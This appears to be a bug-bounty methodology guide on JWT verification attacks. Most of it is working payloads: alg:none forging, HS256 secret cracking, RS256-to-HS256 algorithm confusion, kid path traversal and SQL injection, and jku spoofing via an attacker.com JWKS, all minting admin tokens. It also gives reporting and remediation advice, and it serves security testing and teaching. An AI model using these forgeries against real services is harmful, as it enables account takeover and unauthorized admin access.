# JWT Attacks

> One-line summary: JSON Web Tokens are self-contained auth tokens, so if the signature check is missing, weak, or confusable you can forge any identity — paid critical when it yields account takeover or admin access.

## Overview

A JWT is `base64url(header).base64url(payload).signature` — the header declares the algorithm, the payload carries claims (`sub`, `role`, `exp`), and the signature is supposed to bind both. The flaw class is server-side verification abuse: accepting `alg: none`, verifying HS256 with a guessable/hardcoded secret, letting an RS256 token be re-signed as HS256 using the *public* key as the HMAC secret (algorithm confusion), or following attacker-supplied key material in `kid`/`jku`/`x5u` headers. Because the payload is plain text, any of these failures means you choose your own `sub`, `role`, and expiry. In bug bounty these are critical because a forged token usually equals full account takeover, and the proof is a single reproducible request.

## Where to find it

- Login/refresh responses that return `eyJ...` blobs — check `Authorization: Bearer` values, `token=` cookies, and localStorage after a browser login
- SSO/OIDC flows: `id_token` values, `/token` responses, JWKS endpoints (`/.well-known/jwks.json`, `/oauth/discovery/keys`)
- Adjacent token types that are secretly JWTs: email verification links, password reset tokens, invitation tokens, API keys, signed URLs (decode any dotted base64 blob before assuming it is opaque)
- Header inspection targets: decode every JWT you collect and note `alg`, `kid`, `jku`, `x5u`, `jwk` — unusual values (`kid` = filename, `jku` = internal URL) are the entry points
- Endpoints that verify tokens loosely: WebSocket auth, GraphQL over WS, gRPC-gateway, "download" endpoints that take a `token=` query parameter

## Methodology

1. **Collect and decode** — grab tokens from every login path (web, mobile API, SSO). Decode header and payload, record `alg`, `kid`, claims, and expiry. A token accepted with an implausible `sub`/`role` value is your baseline.
2. **Test `alg: none`** — re-sign with `{"alg":"none"}` and an empty signature: keep the trailing dot, drop the signature. Try case variants (`None`, `NONE`, `nOnE`) because some libraries compare case-sensitively. Variants that also matter: signature removed entirely (no trailing dot), blank signature, and `"alg":"null"`.
3. **Crack HS256 secrets** — offline dictionary attack against the raw token with hashcat or jwt_tool; use `rockyou` plus a JWT-specific wordlist (wallarm/jwt-secrets). Common hits: `secret`, `your-256-bit-secret`, company name, project name, `jwtkey`.
4. **Algorithm confusion (RS256 → HS256)** — if the server signs with RS256, obtain its public key (JWKS endpoint, `/.well-known/`, TLS certificate, docs, GitHub) and sign an HS256 token using the public key's PEM bytes as the HMAC secret. Broken libraries then verify your HMAC with the public key as the secret and pass.
5. **kid injection** — the `kid` header selects the key; if it reaches a filesystem path, point it at `/dev/null` (empty key — sign with an empty key) or another file whose contents you can predict. If it reaches SQL, inject a UNION that returns a key you know.
6. **jku/x5u/jwk abuse** — generate your own RSA keypair, host a JWKS document containing your public key, and set `jku` (or `x5u`/inline `jwk`) to it. If the server fetches that URL and trusts the key, your forged RS256 token is valid.
7. **Claim-level abuse** — after (or without) signature issues: swap `sub` for another user, flip `role`/`is_admin`, set `exp` far in the future, replay `jti`s, test `aud`/`iss` from another environment (staging tokens accepted in prod).
8. **Prove impact** — use the forged token against a protected endpoint and retrieve data belonging to the impersonated account (or an admin action), keeping one victim request and one admin request as evidence.

## Payloads

```bash
# Decode header + payload (padding-safe, no tool needed)
JWT='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0.SIGNATURE'
for part in 1 2; do
  echo "$JWT" | cut -d. -f$part | \
    python3 -c "import base64,sys; p=sys.stdin.read().strip(); print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())"
done

# Or with jwt_tool (full analysis: alg, claims, known-issue checks)
python3 jwt_tool.py "$JWT"
```

```bash
# alg:none forge — keep the trailing dot, empty signature
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"sub":"admin","role":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="$HEADER.$PAYLOAD."
curl -s https://target.com/api/me -H "Authorization: Bearer $TOKEN"

# jwt_tool equivalents: -X a (alg:none), -X n (null signature)
python3 jwt_tool.py "$JWT" -X a
```

```bash
# Crack the HS256 secret offline
printf '%s' "$JWT" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt          # mode 16500 = JWT
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt  # same attack, auto-exploit on hit
john --format=HMAC-SHA256 jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt   # jumbo
# Kali note: gunzip /usr/share/wordlists/rockyou.txt.gz first if only the .gz exists
```

```bash
# Forge with the cracked/found secret
python3 - <<'EOF'
import jwt
print(jwt.encode({"sub":"admin","role":"admin","exp":9999999999}, "SECRET_FOUND", algorithm="HS256"))
EOF
# Or with jwt_tool: add/replace a claim and re-sign in one shot
python3 jwt_tool.py "$JWT" -I -pc role -pv admin -S hs256 -p "SECRET_FOUND"
```

```bash
# Algorithm confusion RS256 -> HS256 (public key as HMAC secret)
# Step 1: get the public key as PEM
curl -s https://target.com/.well-known/jwks.json | jq   # if JWKS, rebuild PEM from n/e:
python3 - <<'EOF'
import base64, json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
k = json.load(open("jwks.json"))["keys"][0]
b64 = lambda s: base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
n = int.from_bytes(b64(k["n"]), "big"); e = int.from_bytes(b64(k["e"]), "big")
pub = RSAPublicNumbers(e, n).public_key(default_backend())
open("public.pem", "wb").write(pub.public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
EOF
# Or from the TLS certificate:
# openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > public.pem
# Step 2: sign HS256 with the PEM text as the key
python3 - <<'EOF'
import jwt
pub = open("public.pem").read()
print(jwt.encode({"sub":"admin","role":"admin","exp":9999999999}, pub, algorithm="HS256"))
EOF
```

```bash
# kid path traversal -> sign with the empty key read from /dev/null
python3 - <<'EOF'
import hmac, hashlib, base64, json
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
h = b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}).encode())
p = b64(json.dumps({"sub":"admin","role":"admin","exp":9999999999}).encode())
sig = b64(hmac.new(b"", h + b"." + p, hashlib.sha256).digest())
print((h + b"." + p + b"." + sig).decode())
EOF

# kid SQL injection (when kid is used in a lookup query)
# header: {"alg":"HS256","kid":"nonexistent' UNION SELECT 'my-key'-- -"}
# then sign the payload with the literal key: my-key
```

```bash
# jku abuse: host your own JWKS, point the header at it
openssl genrsa -out jwt_rsa.key 2048
openssl rsa -in jwt_rsa.key -pubout -out jwt_rsa.pub
N=$(openssl rsa -in jwt_rsa.key -noout -modulus | cut -d= -f2 | xxd -r -p | base64 -w0 | tr '+/' '-_' | tr -d '=')
printf '{"keys":[{"kty":"RSA","e":"AQAB","kid":"attacker","n":"%s","alg":"RS256","use":"sig"}]}' "$N" > jwks.json
# serve jwks.json at https://attacker.com/jwks.json, then forge:
python3 - <<'EOF'
import jwt
key = open("jwt_rsa.key").read()
print(jwt.encode({"sub":"admin","role":"admin","exp":9999999999}, key, algorithm="RS256",
                 headers={"jku":"https://attacker.com/jwks.json","kid":"attacker"}))
EOF

# jwt_tool shortcuts: -X i (inline jwk injection), -X s -ju https://attacker.com/jwks.json (JWKS spoofing),
# -M at (run the whole battery), -T (interactive tamper mode)
```

## Bypasses & edge cases

- **`alg` case/name variants** — `None`, `NONE`, `nOnE`, `null`, missing `alg` (some libs default to none); also try removing the signature entirely vs an empty-string signature (trailing dot vs no dot).
- **Empty/blank signature acceptance** — libraries that split on `.` and skip verification when the third part is falsy accept `header.payload.` directly.
- **Key-as-parser quirks in algorithm confusion** — the server HMACs with whatever bytes it holds: PKCS#1 vs SPKI PEM formatting differ, so if one form fails, re-encode the key (`openssl rsa -pubin -in public.pem -RSAPublicKey_out`) and retry.
- **kid beyond traversal** — SQL injection in the lookup, command injection if the kid is passed to a shell, and SSRF if `kid` is fetched as a URL. If the application uses the kid value *itself* as the HMAC key (instead of a lookup), sign with the kid string.
- **jku/x5u constraints** — some implementations require `https`, some allowlist hosts, some follow redirects (host your JWKS behind an open redirect on an allowed domain). `jwk` embedded inline skips hosting entirely.
- **Claim edge cases** — `exp` as a string or `0`, `nbf` in the future ignored, missing `aud`/`iss` checks, tokens from another service sharing the signing key (cross-environment replay), and refresh tokens that outlive logout.
- **Token transport quirks** — tokens also arrive via cookies, `?token=` links, and `X-Auth-Token` headers; a token accepted in a URL may be logged (proxies, analytics) and replayable. Multiple token sources: the server may only verify the cookie and ignore the header, or vice versa.
- **Weak secret patterns** — before dumping rockyou, try the application name, domain, `secret`, `jwt`, `changeme`, and the `kid` value itself as a secret; internal apps reuse signing keys across products constantly.

## Tools

```bash
# jwt_tool — decode, crack, tamper, exploit
python3 jwt_tool.py "$JWT"                    # analysis
python3 jwt_tool.py "$JWT" -M at              # all tests (none, blank sig, kid, jwks, confusion where keys supplied)
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py "$JWT" -X a               # alg:none
python3 jwt_tool.py "$JWT" -X i               # inline JWK injection
python3 jwt_tool.py "$JWT" -X s -ju https://attacker.com/jwks.json
python3 jwt_tool.py "$JWT" -T                 # interactive tamper

# Crackers
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john --format=HMAC-SHA256 jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt

# JWT-specific secret wordlist (much higher hit rate than rockyou alone)
git clone https://github.com/wallarm/jwt-secrets
python3 jwt_tool.py "$JWT" -C -d jwt-secrets/jwt.secrets.list

# Burp: "JWT Editor" extension (BApp Store) — decode, edit, generate keys, sign/verify inside Repeater
# nuclei — community templates for JWT misconfigurations
nuclei -u https://target.com -tags jwt
```

## Escalation & chaining

- **JWT → ATO** — swap `sub`/`user_id` for a victim ID and confirm by reading their profile or triggering a password reset; document with both accounts.
- **JWT → admin** — flip `role`/`is_admin`/`scopes` claims; often the same token unlocks admin API paths that were enumerable all along.
- **JWT → cloud/infra** — some CI/CD and internal tools use JWTs as the only gate; admin claims there reach deployment systems.
- **OIDC cross-client confusion** — an `id_token` minted for client A accepted by client B (shared secret or no `aud` check) takes over accounts that trust the other client.
- **Leaked-token replay** — tokens in URLs land in logs, Referer headers, and analytics; combine with open redirects or log-reading bugs to replay victim sessions.
- **Algorithm confusion → persistent access** — once you can mint valid tokens, every authenticated endpoint becomes yours to test; chain into IDOR for full data access.

## Report notes

- Show decoded header and payload **before** (original token) and **after** (forged token), then the response from the protected endpoint — three artifacts, same request chain.
- State the exact flaw: "server accepts `alg: none`", "HS256 secret cracked: `secret` (found in 0.3s with rockyou)", "RS256 verified as HS256 using the public key from `/.well-known/jwks.json`".
- Include the full `jwt_tool`/python command that produced the forged token so triage can reproduce byte-for-byte.
- Redact the final tokens' last segments and any sensitive claim data; one redacted victim record is enough.
- For collaboration-heavy programs, keep the forged token valid only for the session used in the report (short `exp`) to limit misuse.
- Remediation: pin the expected algorithm server-side, use strong random HS256 secrets or RS256 with proper key handling, validate `kid`/`jku`/`x5u` against an allowlist, and verify `exp`/`aud`/`iss` on every path.

## References

- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt)
- [PortSwigger — Algorithm confusion attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [PortSwigger lab — JWT auth bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
- [Auth0 — Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [RFC 8725 — JWT Best Current Practices](https://datatracker.ietf.org/doc/html/rfc8725)
- [OWASP — JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [wallarm/jwt-secrets wordlist](https://github.com/wallarm/jwt-secrets)
- [HackTricks — JWT vulnerabilities](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [jwt.io](https://jwt.io/)
